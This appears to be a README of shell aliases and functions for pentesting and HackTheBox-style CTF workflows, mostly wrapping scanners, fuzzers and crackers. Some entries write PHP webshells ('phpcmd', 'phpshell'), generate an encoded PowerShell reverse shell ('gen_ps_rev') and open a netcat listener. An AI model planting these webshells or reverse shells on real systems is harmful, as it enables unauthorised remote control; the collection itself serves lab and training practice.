# Aliases & Shell Functions

A collection of useful aliases and shell functions for pentesting and CTF workflows.

> Some aliases are taken from: [jazzpizazz/zsh-aliases](https://github.com/jazzpizazz/zsh-aliases), shoutout to jazzpizazz

---

#### `tun0` - Print tun0 IP

```bash
alias tun0="ifconfig tun0 | grep 'inet ' | cut -d ' ' -f10 | tr -d '\n'"
```

#### `http` - HTTP server with tun0 IP

Print tun0 IP and start a Python HTTP server on port 80.

```bash
alias http="echo -e \"\033[34m> tun0: \$(ifconfig tun0 | grep 'inet ' | awk '{print \$2}')\033[0m\n\" && python -m http.server 80"
```

#### `adb_set_proxy` - Set ADB proxy

```bash
alias adb_set_proxy="adb shell settings put global http_proxy $(ip -o -4 addr show eth0 | awk '{print $4}' | sed 's/\/.*//g'):8080"
```

#### `adb_unset_proxy` - Unset ADB proxy

```bash
alias adb_unset_proxy="adb shell settings put global http_proxy :0"
```

#### `j` - Crack hash with John

```bash
alias j="john --wordlist=/opt/seclists/Passwords/Leaked-Databases/rockyou.txt"
```

#### `lab` - HackTheBox machines VPN

```bash
alias lab='sudo openvpn ~/hackthebox/vpn/release_arena_eu-release-1.ovpn'
```

#### `vol2` - Volatility 2

```bash
alias vol2="python2 ~/tools/volatility/vol.py"
```

#### `phpcmd` - Minimal PHP webshell

Writes `<?=`\$_GET[0]`?>` to `cmd.php`.

```bash
alias phpcmd='echo "<?=\`\$_GET[0]\`?>" > cmd.php && echo "[+] wrote <?=\`\$_GET[0]\`?> in cmd.php"'
```

#### `phpshell` - PHP system shell

Writes `<?php system($_REQUEST["cmd"]); ?>` to `rce.php`.

```bash
alias phpshell='echo "<?php system(\$_REQUEST[\"cmd\"]); ?>" > rce.php && echo "[+] wrote <?php system(\$_REQUEST[\"cmd\"]); ?> in rce.php"'
```

#### `linpeas` - Download LinPEAS

Downloads the latest version and saves it as `lin.sh`.

```bash
alias linpeas="curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -s --output lin.sh"
```

#### `sliver-server` - Run Sliver server

```bash
alias sliver-server="~/tools/sliver/sliver-server"
```

#### `sliver-client` - Run Sliver client

```bash
alias sliver-client="~/tools/sliver/sliver-client"
```

#### `bloodhound` - Run BloodHound

```bash
alias bloodhound="/opt/BloodHound/BloodHound --disable-gpu-sandbox"
```

#### `kerbrute` - Run Kerbrute

```bash
alias kerbrute="/home/serioton/tools/kerbrute"
```

#### `ptty` - Copy shell stabilization command

Copies `python3 -c 'import pty;pty.spawn("/bin/bash")'` to clipboard.

```bash
alias ptty="echo python3 -c 'import pty;pty.spawn(\"/bin/bash\")' | xclip -selection clipboard"
```

#### `scan` - Nmap TCP scan

```bash
scan () {
  if [ "$#" -ne 1 ]; then
    echo "[i] Usage: scan <ip>"
  else
    sudo nmap -sC -sV -T4 -vv "$1" | tee nmap.txt
  fi
}
```

#### `nmap_udp` - Nmap UDP scan

```bash
nmap_udp () {
  if [ $# -eq 0 ]
    then
      echo "[i] Usage: nmap_udp ip (options)"
    else
      [ ! -d "./nmap" ] && echo "[i] Creating $(pwd)/nmap..." && mkdir nmap
      sudo nmap -sUCV -T4 --min-rate 10000 "${@}" -v -oA nmap/udp_default
  fi
}
```

#### `pyenv` - Activate tool venv

Open a Python virtual environment for a specific tool.

```bash
pyenv() {
    if [ -z "$1" ]; then
        echo "[-] usage pyenv tool_path"
    else
        source ~/tools/windows/"$1"/venv/bin/activate
    fi
}
```

#### `workon` - Set up machine workspace

Creates a directory structure for a target machine with enum tools.

```bash
workon () {
  if [ "$#" -ne 1 ]; then
    echo "[i] Usage: workon <machine_name>"
  else
    MACHINE_NAME=$1
    MACHINE_DIR=~/hackthebox/$MACHINE_NAME
    WWW=$MACHINE_DIR/www
    
    mkdir -p $WWW    
    cp -r ~/tools/enum/* $WWW
    touch $MACHINE_DIR/notes.txt $MACHINE_DIR/creds.txt

    echo "[>] DONE!"
  fi
}
```

#### `fuzz` - Directory fuzzing with ffuf

```bash
fuzz () {
  if [ "$#" -ne 1 ];
    then
      echo "[i] Usage: fuzz URL"
    else
      ffuf -c -ac -u "$1/FUZZ" -w /opt/seclists/Discovery/Web-Content/raft-small-directories.txt
  fi
}
```

#### `vfuzz` - Subdomain fuzzing with ffuf

```bash
vfuzz () {
  if [ "$#" -ne 2 ];
    then
      echo "[i] Usage: fuzz URL DOMAIN"
    else
      ffuf -c -ac -u "$1" -w /opt/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.$2"
  fi
}
```

#### `gen_ps_rev` - PowerShell reverse shell

Generate a Nishang one-liner TCP shell and copy it to clipboard.

```bash
gen_ps_rev () {
  if [ "$#" -ne 2 ]; 
    then
      echo "[i] Usage: gen_ps_rev ip port"
    else
      SHELL=`cat ~/tools/shells/Invoke-PowerShellTcpOneLine.ps1 | sed s/x.x.x.x/$1/g | sed s/yyy/$2/g | iconv -f utf8 -t utf16le | base64 -w 0`
      echo "powershell -ec $SHELL" | xclip -sel clip
  fi
}
```

#### `rl` - Netcat listener with rlwrap

```bash
rl() {
    if [ -z "$1" ]; then
        echo "specify a port"
    else
        rlwrap nc -nlvp "$1"
    fi
}
```
